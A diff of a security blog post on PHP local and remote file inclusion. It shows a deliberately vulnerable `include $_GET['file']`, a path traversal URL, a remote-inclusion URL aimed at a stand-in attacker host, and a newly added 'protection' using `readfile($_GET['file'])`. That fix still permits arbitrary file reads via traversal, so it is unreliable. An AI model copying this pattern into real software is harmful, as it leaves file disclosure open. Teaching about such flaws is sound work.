@@ -178,7 +178,30 @@ Example for RFI: <code>http://localhost/app.php?file=http://attackers.website.co
 Take this one-liner for example: <code>&lt;?php include $_GET['file']; ?&gt;</code><br>
 An attacker now can make us of additional trailing slashes and dots to access some sensitive file, like this: <br>
 <code>http://localhost/app.php?file=fileYouShouldSee.php</code><br>
-<code>http://localhost/app.php?file=../../secret</code>
+<code>http://localhost/app.php?file=../../secret</code><br>
+
+You may be thinking now, how to protect against something like this? Well it depends on the situation, but the first thing you should consider is to rethink, do you need to execute that file or you just need the content inside of it, if not then you can use <code>readfile()</code> function. Now it's only displaying the contents of file and not executing it.This way you are making escalation of the issue to some server-side injection very less likely.
+
+Here's an example with <code>readfile()</code>:
+This is your directory:
+
+- index.php
+- test.php
+
+index.php:
+<code>
+<?php
+    readfile($_GET['file']);
+?>
+</code><br>
+test.php:
+<code>
+<?php 
+    echo "<strong>Test</strong>";
+?>
+</code><br>
+Now when you send this request to the server <code>http://localhost/?file=test.php</code> it will just reply with the content of the file <code>test.php</code>:<br>
+![image](https://github.com/KiraReys/blog/assets/44244085/3bb3a30f-34c1-4ef0-93b6-3b77797c3c62)
 
 
 
